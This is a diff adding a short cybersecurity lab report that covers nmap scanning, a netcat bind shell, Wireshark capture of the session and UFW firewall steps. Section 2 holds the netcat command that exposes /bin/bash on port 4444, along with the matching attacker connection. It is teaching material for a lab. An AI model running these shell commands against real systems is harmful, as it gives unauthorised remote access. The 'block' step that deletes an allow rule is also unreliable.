@@ -1,0 +1,35 @@
+==========================================================
+      CYBERSECURITY LAB: END-TO-END COMPLETION REPORT
+==========================================================
+Date: February 2026
+Topic: Network Reconnaissance, Exploitation, and Defense
+
+1. RECONNAISSANCE (Nmap)
+   - Command: nmap -sV -p [port] [IP]
+   - Goal: Identify open ports and service versions.
+   - States: 
+     * Open (Service is running)
+     * Closed (No service)
+     * Filtered (Firewall is blocking)
+
+2. EXPLOITATION (Netcat Bind Shell)
+   - Target Setup: nc -lvp 4444 -e /bin/bash
+   - Attacker Connection: nc [Target_IP] 4444
+   - Discovery: Commands are sent in unencrypted PLAIN TEXT.
+
+3. FORENSICS (Wireshark)
+   - Capture Filter: tcp.port == 4444
+   - Analysis Technique: Right-click > Follow > TCP Stream.
+   - Evidence: Red/Blue text reveals the full conversation.
+
+4. DEFENSIVE HARDENING (UFW Firewall)
+   - Enable Firewall: sudo ufw enable
+   - Block Attack Port: sudo ufw delete allow 4444/tcp
+   - Check Shields: sudo ufw status
+
+5. SUMMARY LESSON
+   Security is layered. A firewall blocks the entry, but 
+   encryption (like SSH) protects the data if the firewall 
+   fails. Always use "hostname -I" to know your position 
+   on the network.
+==========================================================
